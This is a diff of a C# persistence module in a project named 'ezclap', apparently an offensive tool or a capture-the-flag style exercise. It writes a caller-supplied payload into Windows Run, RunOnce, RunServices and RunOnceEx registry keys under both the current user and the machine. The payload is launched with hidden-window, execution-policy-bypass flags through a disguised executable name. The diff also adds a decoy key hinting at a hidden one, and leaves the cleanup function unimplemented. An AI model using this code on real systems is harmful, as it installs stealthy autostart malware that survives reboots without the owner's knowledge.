@@ -20,26 +20,32 @@ namespace ezclap
 		}
 		public static void Initialize(string[] names, string payload)
 		{
-            if (names.Length != 7)
-            {
-                Console.WriteLine("[-] AddRunKey requires 7 registry key names.");
-                return;
-            }
+            Random rnd = new Random();
+            int rndNameIdx = rnd.Next(0, names.Length - 1);
             /*
              *  Description: Add RunKey registry key with payload  
              */
 
             payload = "msBuilder.exe -ep bypass -nop -windowstyle hidden -c " + payload;
 
-            Utils.setHKCUSubKey(RegistryKeys.RunKey, names[0], payload);
-            Utils.setHKCUSubKey(RegistryKeys.RunOnceKey, names[1], payload);
+            Utils.setHKCUSubKey(RegistryKeys.RunKey, names[rndNameIdx], payload);
+            Utils.setHKCUSubKey(RegistryKeys.RunOnceKey, names[rndNameIdx], payload);
 
-            Utils.setHKLMSubKey(RegistryKeys.RunKey, names[2], payload);
-            Utils.setHKLMSubKey(RegistryKeys.RunOnceKey, names[3], payload);
-            Utils.setHKLMSubKey(RegistryKeys.RunServices, names[4], payload);
-            Utils.setHKLMSubKey(RegistryKeys.RunServicesOnce, names[5], payload);
-            Utils.setHKLMSubKey(RegistryKeys.RunOnceEx, names[6], payload);
+            Utils.setHKLMSubKey(RegistryKeys.RunKey, names[rndNameIdx], payload);
+            Utils.setHKLMSubKey(RegistryKeys.RunOnceKey, names[rndNameIdx], payload);
+            Utils.setHKLMSubKey(RegistryKeys.RunServices, names[rndNameIdx], payload);
+            Utils.setHKLMSubKey(RegistryKeys.RunServicesOnce, names[rndNameIdx], payload);
+            Utils.setHKLMSubKey(RegistryKeys.RunOnceEx, names[rndNameIdx], payload);
+
+            Utils.setHKLMSubKey(RegistryKeys.RunKey, "Good job you have found something", "There is a hidden key as well. Try to find that! That is why the error message is showing up.");
             
+        } 
+
+        public static void deleteKeys()
+        {
+            // TODO: Implement deleting runkeys 
+            // Open up registry keys and see if there are names of the key. If name found, delete the key. 
         }
+
 	}
 }
